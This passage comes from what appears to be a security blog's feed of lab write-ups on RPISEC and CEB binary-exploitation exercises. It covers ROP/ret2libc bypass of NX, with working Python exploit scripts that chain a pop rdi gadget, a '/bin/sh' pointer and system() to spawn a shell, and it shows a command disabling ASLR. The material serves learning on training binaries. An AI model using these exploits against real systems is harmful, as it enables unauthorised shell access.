that the system() function argument is passed to the RDI register and then passed to the function.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> lab5C <span class="nt">--ropchain</span> | <span class="nb">grep </span>pop
0x000000000040113b : add byte ptr <span class="o">[</span>rcx], al <span class="p">;</span> pop rbp <span class="p">;</span> ret
0x0000000000401136 : mov byte ptr <span class="o">[</span>rip + 0x2f03], 1 <span class="p">;</span> pop rbp <span class="p">;</span> ret
0x00000000004013ac : pop r12 <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013ae : pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013b0 : pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013b2 : pop r15 <span class="p">;</span> ret
0x00000000004013ab : pop rbp <span class="p">;</span> pop r12 <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013af : pop rbp <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x000000000040113d : pop rbp <span class="p">;</span> ret
0x00000000004013b3 : pop rdi <span class="p">;</span> ret  &lt;<span class="o">=====</span> this addr
0x00000000004013b1 : pop rsi <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013ad : pop rsp <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
</code></pre></div></div> <p>Now let’s get the address of the system function:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/systemaddr.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Lastly, the address of the string “/bin/sh” that we will use as an argument for system()</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/binshaddr.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <h3 id="having-all-the-addresses-we-will-put-them-in-the-exploit">Having all the addresses we will put them in the exploit</h3> <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">struct</span>

<span class="n">gadget</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x00000000004013b3</span><span class="p">)</span>

<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x7ffff7f7f152</span><span class="p">)</span>

<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x7ffff7e2fe50</span><span class="p">)</span>

<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">136</span> <span class="o">+</span> <span class="n">gadget</span> <span class="o">+</span> <span class="n">binsh_addr</span> <span class="o">+</span> <span class="n">sys_addr</span><span class="p">)</span>
</code></pre></div></div> <h3 id="now-lets-run-it-in-gdb-and-see-if-it-works">Now let’s run it in GDB and see if it works.</h3> <p>We can see the “pop rdi” gadget followed by “/bin/sh” and system on the stack:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exprop1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>After pop rdi is executed we see that “/bin/sh” was passed to the register:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exprop2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>And after the system call, GDB finishes executing the binary showing that a process has been started:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exprop3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>It seems like everything is fine, the exploit worked in the context of GDB, now let’s see outside.</p> <p>note: It is worth remembering that the machine’s ASLR must be disabled otherwise the exploit will not work. To disable it: <code class="language-plaintext highlighter-rouge">$ sudo sysctl kernel.randomize_va_space=0</code></p> <h3 id="pwn">pwn!</h3> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exprop4.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Remembering that the idea of this laboratory was to be done in 32-bit architecture but I decided to do it in 64-bit because it was more current. In 32 bits, it changes the way exploration is done, passing system() function arguments through the stack and not through registers. The rest is basically the same.</p>]]></content><author><name></name></author><category term="rpisec"/><category term="bin-exp"/><summary type="html"><![CDATA[rpisec lab5C]]></summary></entry><entry><title type="html">bypass NX/DEP do CEB(mentebinaria)</title><link href="https://geleiaa.github.io/blog/2024/bypass_NX/" rel="alternate" type="text/html" title="bypass NX/DEP do CEB(mentebinaria)"/><published>2024-01-10T00:00:00+00:00</published><updated>2024-01-10T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2024/bypass_NX</id><content type="html" xml:base="https://geleiaa.github.io/blog/2024/bypass_NX/"><![CDATA[<h3 id="bypass-nxdep">Bypass NX/DEP</h3> <h3 id="esse-texto-reúne-o-que-aprendi-sobre-bypass-de-nx-juntando-as-video-aulas-do-curso-ceb-de-exploração-de-binarios-aula-do-07-a-14-httpswwwyoutubecomplaylistlistplifzmtppyfp4maqhy_ir8um0mjes7p7s3">Esse texto reúne o que aprendi sobre bypass de NX juntando as video aulas do curso CEB de exploração de binarios. Aula do 07 a 14 (https://www.youtube.com/playlist?list=PLIfZMtpPYFP4MaQhy_iR8uM0mJEs7P7s3)</h3> <p>Primeiro vamos a uma breve introdução sobre o NX ou também conhecido como DEP(Data Execution Prevention):</p> <p>O NX/DEP é uma técnica de mitigação de exploração usada para garantir que apenas segmentos de código são sempre marcados como executáveis…</p> <p>Ok, mas como assim somente segmentos de código marcados como executáveis??</p> <p>Bom, vamos lá. Nos writeups anteriores vimos que para explorar os binários, usamos a técnica de Buffer-overflow para sobrescrever um endereço de retorno e, logo depois dessa sobrescrita, jogamos algum shellcode na stack, para assim ganharmos controle sobre o fluxo de execução do binário. Essa exploração só é possível porque o binário em questão foi compilado com a flag <code class="language-plaintext highlighter-rouge">-z execstack</code> que desabilita a proteção NX.</p> <p>Agora com a proteção ativada, as areas da stack e heap NÃO possuem permissão de execução. Sendo assim, não será possível realizar a exploração jogando algum shellcode na stack, porque simplesmente não será executado (e provavelmente resultara em um SEGFAULT).</p> <p>Sabendo disso, vamos para a parte do bypass…</p> <h3 id="bypass">Bypass</h3> <ul> <li>“If you can’t inject (shell)code to do your bidding, you must re-use the existing code!” RPISEC - MBE lecture_07</li> </ul> <p>Se você não pode injetar código… reutilize o código existente.</p> <p>O bypass mais conhecido para o NX é o ROP <code class="language-plaintext highlighter-rouge">(Return Oriented Programming)</code>. ROP é uma técnica para reutilizar código/instruções existentes em um binário para montar algo malicioso. Outros termos conhecidos são <code class="language-plaintext highlighter-rouge">ROPgadgets/Gadgets</code> e <code class="language-plaintext highlighter-rouge">ROPchain</code>.</p> <p>Os <code class="language-plaintext highlighter-rouge">ROPgadgets</code> ou só <code class="language-plaintext highlighter-rouge">Gadgets</code> basicamente são instruções presentes na memória do binário, que não fazem parte da execução da <code class="language-plaintext highlighter-rouge">main</code>, mas podem ser utilizadas porque são parte da execução do binário (e geralemente terminam com uma instrução <code class="language-plaintext highlighter-rouge">RET</code>). Esses gadgets podem ser usados para montar instruções maliciosas semelhante a um shellcode. A junção desses gadgets é chamada de <code class="language-plaintext highlighter-rouge">ROPchain</code>.</p> <h3 id="tudo-bem-ja-sabemos-o-que-é-o-nx-e-qual-tecnica-é-usada-para-bypassa-lo-agora-vamos-para-a-demonstração">Tudo bem, ja sabemos o que é o NX e qual tecnica é usada para “bypassa-lo”. Agora vamos para a demonstração:</h3> <p>A ideia é a seguinte: já que não podemos executar um shellcode através da stack, temos que executar algo parecido, então vamos usar a técnica <code class="language-plaintext highlighter-rouge">ret2libc</code>. Essa técnica consiste em fazer o binário chamar funções da libc usando os endereços de memória carregados pelo próprio binário em tempo de execução.</p> <p>Para o exemplo chamaremos a função <code class="language-plaintext highlighter-rouge">system()</code>, e como a função system() sem argumentos não faz nada, vamos passar pra ela a string <code class="language-plaintext highlighter-rouge">"/bin/sh"</code> . Dessa forma temos algo parecido com um shellcode.</p> <h3 id="step-by-step-da-exploração">Step by step da exploração</h3> <h4 id="1---o-binário-usado-de-exemplo-nas-aulas-era-vulneravel-a-um-bof-então-a-primeira-coisa-a-fazer-é-estourar-o-buffer-e-controlar-algum-endereço-de-retorno">1 - O binário usado de exemplo nas aulas era vulneravel a um B.O.F, então a primeira coisa a fazer é estourar o buffer e controlar algum endereço de retorno.</h4> <h4 id="2---depois-de-explorar-o-bof-precisamos-saber-qual-gadget-pode-ser-usado-de-forma-maliciosa-para-isso-vamos-usar-a-tool-ropgadget-httpsgithubcomjonathansalwanropgadget-">2 - Depois de explorar o B.O.F precisamos saber qual <code class="language-plaintext highlighter-rouge">Gadget</code> pode ser usado de forma maliciosa. Para isso vamos usar a tool ROPgadget (https://github.com/JonathanSalwan/ROPgadget) .</h4> <p>Vamos procurar <code class="language-plaintext highlighter-rouge">gadgets</code> filtrando por <code class="language-plaintext highlighter-rouge">"pop rdi"</code>. Porque os registradores <code class="language-plaintext highlighter-rouge">RDI</code> e <code class="language-plaintext highlighter-rouge">RSI</code> são usados para passagem de argumentos na arquitetura de 64 bits. Para que o argumento “/bin/sh” seja passado para a função system ele precisa estar em algum desses registradores.</p> <p>Rodando a tool e analisando a saida, vemos a instrução que precisamos:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> aula_13 <span class="nt">--ropchain</span> | <span class="nb">grep</span> <span class="s2">"pop"</span>

...

0x00000000004011ab : pop rbp <span class="p">;</span> pop r12 <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004011af : pop rbp <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x0000000000401109 : pop rbp <span class="p">;</span> ret
0x00000000004011b3 : pop rdi <span class="p">;</span> ret 	&lt;<span class="o">======</span> essa aqui
0x00000000004011b1 : pop rsi <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004011ad : pop rsp <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
</code></pre></div></div> <p>Deixe o endereço separado e vamos para o próximo passo.</p> <h4 id="3---agora-precisamos-achar-o-endereço-da-string-binsh-na-memória-a-qual-o-binário-tem-acesso-em-tempo-de-execução">3 - Agora precisamos achar o endereço da string <code class="language-plaintext highlighter-rouge">"/bin/sh"</code> na memória a qual o binário tem acesso em tempo de execução.</h4> <p>Para isso vamos rodar o binário no GDB, setar um breakpoint qualquer e logo depois da execução parar no breakpoint, vamos buscar pela string “/bin/sh” da seguinte forma: <code class="language-plaintext highlighter-rouge">gdb-peda$ find "/bin/sh"</code></p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>find <span class="s2">"/bin/sh"</span>
Searching <span class="k">for</span> <span class="s1">'/bin/sh'</span> <span class="k">in</span>: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7f745bd <span class="nt">--</span><span class="o">&gt;</span> 0x68732f6e69622f <span class="o">(</span><span class="s1">'/bin/sh'</span><span class="o">)</span>
</code></pre></div></div> <p>Deixe esse endereço separado também e vamos para o próximo passo.</p> <h4 id="4---a-ultima-das-nossas-buscas-será-pelo-endereço-da-função-system-fazendo-da-mesma-forma-que-o-endereço-de-binsh">4 - A ultima das nossas buscas será pelo endereço da função <code class="language-plaintext highlighter-rouge">system()</code>. Fazendo da mesma forma que o endereço de “/bin/sh”.</h4> <p>Rode o binário no GDB, sete um breakpoint qualquer e logo depois da execução parar no breakpoint, busque pelo endereço da seguinte forma: <code class="language-plaintext highlighter-rouge">gdb-peda$ p system</code></p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>p system
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>int <span class="o">(</span>const char <span class="k">*</span><span class="o">)}</span> 0x7ffff7e12290 &lt;__libc_system&gt;
</code></pre></div></div> <h4 id="5---depois-de-ter-os-endereços-necessários-vamos-montar-o-script-do-exploit">5 - Depois de ter os endereços necessários vamos montar o script do exploit:</h4> <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">struct</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">88</span>                              <span class="c1">#JUNK
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x4011b3</span><span class="p">)</span>      <span class="c1">#POP RDI; RET;
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x7ffff7f745bd</span><span class="p">)</span>    <span class="c1">#POINTER TO "/bin/sh"
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x7ffff7e12290</span><span class="p">)</span>    <span class="c1">#SYSTEM ADDR
</span>
<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">exp</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</code></pre></div></div> <h4 id="6---agora-com-tudo-pronto-vamos-executar-o-exploit-e-ver-como-tudo-funciona">6 - Agora com tudo pronto vamos executar o exploit e ver como tudo funciona:</h4> <ul> <li>RET sobrescrito com o Gadget</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bpnx1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>O “/bin/sh” seguido pela função system na stack</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bpnx2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>“/bin/sh” passado para o registrador RDI</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bpnx3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>entrando na função system</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bpnx4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>GDB termina execução e sai startando um novo processo</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bpnx5.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>rodando a exploração fora do GDB</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/bpnx6.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div>]]></content><author><name></name></author><category term="bin-exp"/><summary type="html"><![CDATA[binary exploitation]]></summary></entry><entry><title type="html">shellcode lab RPISEC</title><link href="https://geleiaa.github.io/blog/2023/shellcode_lab/" rel="alternate" type="text/html" title="shellcode lab RPISEC"/><published>2023-12-14T00:00:00+00:00</published><updated>2023-12-14T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2023/shellcode_lab</id><content type="html" xml:base="https://geleiaa.github.io/blog/2023/shellcode_lab/"><![CDATA[<h3 id="solving-lab3c--0224---shellcoding-lab-httpsgithubcomrpisecmbeblobmastersrclab03lab3cc">Solving lab3C “| 02/24 | –[ Shellcoding Lab” (https://github.com/RPISEC/MBE/blob/master/src/lab03/lab3C.c)</h3> <h3 id="this-lab-is-a-combination-of-buffer-overflow-and-shellcode-the-intention-os-this-lab-is-explore-bof-and-execute-a-shellcode-and-get-a-shell-on-the-machine-where-the-binary-is-running-this-time-we-will-have-the-shell-part">This lab is a combination of buffer-overflow and shellcode. The intention os this lab is explore bof and execute a shellcode and get a shell on the machine where the binary is running. This time we will have the shell part.</h3> <p>First we go get the source code and compile following the instruction that is commented in the code:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -z execstack -fno-stack-protector lab3C.c -o lab3C
</code></pre></div></div> <p>Running the binary we see that it asks for a username. And when I try to enter any username, I get “incorrect username”:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/runbin.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Looking at the binary strings we see something interesting:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ strings lab3C
</code></pre></div></div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/binstrings.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>We see that the binary also asks for a password and probably this password and the username appear right above.</p> <p>We can also see a preview of the functions that binary uses:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/binstrings2.png" class="img-fluid rounded z-depth-1" width="100" height="100" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Testing the username and password I get a slightly strange result…</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/testuserpass.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>It seems that the username is correct but the password is not, or could it be that the binary doesn’t do anything at all?</p> <h3 id="after-trying-to-understand-what-the-binary-does-now-lets-move-on-to-debugging">After trying to understand what the binary does, now let’s move on to debugging</h3> <p>First, let’s take a look at the disassembly of the main function:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>disas main
Dump of assembler code <span class="k">for function </span>main:
   0x0000000000001201 &lt;+0&gt;:	endbr64 
   0x0000000000001205 &lt;+4&gt;:	push   rbp
   0x0000000000001206 &lt;+5&gt;:	mov    rbp,rsp
   0x0000000000001209 &lt;+8&gt;:	sub    rsp,0x50
   0x000000000000120d &lt;+12&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x50],0x0
   0x0000000000001215 &lt;+20&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x48],0x0
   0x000000000000121d &lt;+28&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x40],0x0
   0x0000000000001225 &lt;+36&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x38],0x0
   0x000000000000122d &lt;+44&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x30],0x0
   0x0000000000001235 &lt;+52&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x28],0x0
   0x000000000000123d &lt;+60&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x20],0x0
   0x0000000000001245 &lt;+68&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x18],0x0
   0x000000000000124d &lt;+76&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
   0x0000000000001254 &lt;+83&gt;:	lea    rdi,[rip+0xdd5]        <span class="c"># 0x2030</span>
   0x000000000000125b &lt;+90&gt;:	call   0x1090 &lt;puts@plt&gt;
   0x0000000000001260 &lt;+95&gt;:	lea    rdi,[rip+0xdf0]        <span class="c"># 0x2057</span>
   0x0000000000001267 &lt;+102&gt;:	mov    eax,0x0
   0x000000000000126c &lt;+107&gt;:	call   0x10a0 &lt;<span class="nb">printf</span>@plt&gt;
   0x0000000000001271 &lt;+112&gt;:	mov    rax,QWORD PTR <span class="o">[</span>rip+0x2da8]        <span class="c"># 0x4020 &lt;stdin@@GLIBC_2.2.5&gt;</span>
   0x0000000000001278 &lt;+119&gt;:	mov    rdx,rax
   0x000000000000127b &lt;+122&gt;:	mov    esi,0x100
   0x0000000000001280 &lt;+127&gt;:	lea    rdi,[rip+0x2db9]        <span class="c"># 0x4040 &lt;a_user_name&gt;</span>
   0x0000000000001287 &lt;+134&gt;:	call   0x10b0 &lt;fgets@plt&gt;
   0x000000000000128c &lt;+139&gt;:	mov    eax,0x0
   0x0000000000001291 &lt;+144&gt;:	call   0x11a9 &lt;verify_user_name&gt;
   0x0000000000001296 &lt;+149&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x4],eax
   0x0000000000001299 &lt;+152&gt;:	cmp    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
   0x000000000000129d &lt;+156&gt;:	je     0x12b2 &lt;main+177&gt;
   0x000000000000129f &lt;+158&gt;:	lea    rdi,[rip+0xdc2]        <span class="c"># 0x2068</span>
   0x00000000000012a6 &lt;+165&gt;:	call   0x1090 &lt;puts@plt&gt;
   0x00000000000012ab &lt;+170&gt;:	mov    eax,0x1
   0x00000000000012b0 &lt;+175&gt;:	jmp    0x1309 &lt;main+264&gt;
   0x00000000000012b2 &lt;+177&gt;:	lea    rdi,[rip+0xdcc]        <span class="c"># 0x2085</span>
   0x00000000000012b9 &lt;+184&gt;:	call   0x1090 &lt;puts@plt&gt;
   0x00000000000012be &lt;+189&gt;:	mov    rdx,QWORD PTR <span class="o">[</span>rip+0x2d5b]        <span class="c"># 0x4020 &lt;stdin@@GLIBC_2.2.5&gt;</span>
   0x00000000000012c5 &lt;+196&gt;:	lea    rax,[rbp-0x50]
   0x00000000000012c9 &lt;+200&gt;:	mov    esi,0x64
   0x00000000000012ce &lt;+205&gt;:	mov    rdi,rax
   0x00000000000012d1 &lt;+208&gt;:	call   0x10b0 &lt;fgets@plt&gt;
   0x00000000000012d6 &lt;+213&gt;:	lea    rax,[rbp-0x50]
   0x00000000000012da &lt;+217&gt;:	mov    rdi,rax
   0x00000000000012dd &lt;+220&gt;:	call   0x11d7 &lt;verify_user_pass&gt;
   0x00000000000012e2 &lt;+225&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x4],eax
   0x00000000000012e5 &lt;+228&gt;:	cmp    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
   0x00000000000012e9 &lt;+232&gt;:	je     0x12f1 &lt;main+240&gt;
   0x00000000000012eb &lt;+234&gt;:	cmp    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
   0x00000000000012ef &lt;+238&gt;:	je     0x1304 &lt;main+259&gt;
   0x00000000000012f1 &lt;+240&gt;:	lea    rdi,[rip+0xd9e]        <span class="c"># 0x2096</span>
   0x00000000000012f8 &lt;+247&gt;:	call   0x1090 &lt;puts@plt&gt;
   0x00000000000012fd &lt;+252&gt;:	mov    eax,0x1
   0x0000000000001302 &lt;+257&gt;:	jmp    0x1309 &lt;main+264&gt;
   0x0000000000001304 &lt;+259&gt;:	mov    eax,0x0
   0x0000000000001309 &lt;+264&gt;:	leave  
   0x000000000000130a &lt;+265&gt;:	ret    
End of assembler dump.
</code></pre></div></div> <p>Analyzing we can see that in main there are two more functions: <strong>verify_user_name</strong> and <strong>verify_user_pass</strong>. These are probably the functions that check the name and password input.</p> <p>And just before calling the function <strong>verify_user_name</strong> we can see that the username variable is referenced before calling a <strong>fgets</strong> which can take the name and store it in the variable. Now the function <strong>verify_user_pass</strong> does not have the password variable referenced before being called. This may mean that inputs are stored in different ways…</p> <p>Looking at the disassembly of functions, we don’t see much that is useful:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/disasfuncs.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>We see that the functions probably take the input and do a comparison using the <strong>strncmp</strong> function. If we consider what we saw in the strings, these functions must compare the inputs with the values ​​”rpisec” and “admin”.</p> <h3 id="now-that-we-know-what-the-binary-does-we-can-do-some-tests-to-find-the-best-path-to-shellcode-which-is-the-idea-of-this-lab">Now that we know what the binary does, we can do some tests to find the best path to shellcode, which is the idea of ​​this lab.</h3> <p>Following with what we already know, we first have to test whether any variable can be overflowed. Putting breakpoints in the verification functions right after the input goes to the binary and put a pattern on the inputs for see how it is handled.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/breakfuncs.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Let’s use the alphabet pattern like in the previous lab, so we know when there was a memory leak:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ
</code></pre></div></div> <p>After a few steps in <strong>verify_user_name</strong> we stop at the <strong>strcmp</strong> function call and see the comparison with the string “rpisec”. And we can also notice that one of <strong>strcmp</strong> arguments is “6”, which would be the number of bytes that the function will validate.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/verfname1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>So the first 6 bytes of the input have to be “rpisec”. This can be confirmed because after we go through <strong>strncmp</strong> the flow jumps to a comparison and then print “incorrect username”.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/incorrname.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Then the execution is finished.</p> <h3 id="passing-verify_user_name">Passing verify_user_name</h3> <p>So if we put the string “rpisec” before the pattern we see that <strong>strncpm</strong> only reads the first 6 bytes and with this it is possible to pass the username check.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/passverifname.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>After passing the username verification we arrive at the <strong>verify_user_pass</strong> function. And we can see the password verification being done:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/verifpass1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>As expected, after passing <strong>strncmp</strong> the flow jumps to a comparison and then to the end, but…</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/incorrpass.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>I noticed that no return address was overwritten, neither from <strong>verify_user_name</strong> or <strong>verify_user_pass</strong>. Until we reached the return address of the main function, which got stuck because it was overwritten by our alphabet patter.</p> <div 